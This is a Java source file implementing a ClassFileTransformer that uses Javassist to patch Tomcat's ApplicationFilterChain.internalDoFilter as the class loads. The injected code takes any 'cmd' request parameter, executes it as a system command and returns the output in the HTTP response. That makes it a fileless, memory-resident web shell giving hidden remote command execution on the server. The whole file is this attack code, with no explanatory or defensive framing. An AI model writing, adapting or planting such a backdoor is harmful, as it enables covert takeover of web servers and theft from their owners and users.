package com.company;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {
    public static String className = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {
        if (className.replace(".", "/").equals(s)) {
            try {
                ClassPool cp = ClassPool.getDefault();
                if (aClass != null) {
                    ClassClassPath classPath = new ClassClassPath(aClass);  //get current class's classpath
                    cp.insertClassPath(classPath);  //get current class's classpath
                }
                CtClass cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod("internalDoFilter");
//                m.addLocalVariable("elapsedTime", CtClass.longType);
                m.insertBefore("            String cmd = request.getParameter(\"cmd\");\n" +
                        "            if (cmd != null) {\n" +
                        "                Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                        "                    new java.io.InputStreamReader(process.getInputStream()));\n" +
                        "                StringBuilder stringBuilder = new StringBuilder();\n" +
                        "                String line;\n" +
                        "                while ((line = bufferedReader.readLine()) != null) {\n" +
                        "                    stringBuilder.append(line + '\\n');\n" +
                        "                }\n" +
                        "                response.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "                response.getOutputStream().flush();\n" +
                        "                response.getOutputStream().close();\n" +
                        "            }");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (Exception ex) {
                ex.printStackTrace();
                System.out.println("error:::::"+ex.getMessage());
            }
        }
        return null;
    }
}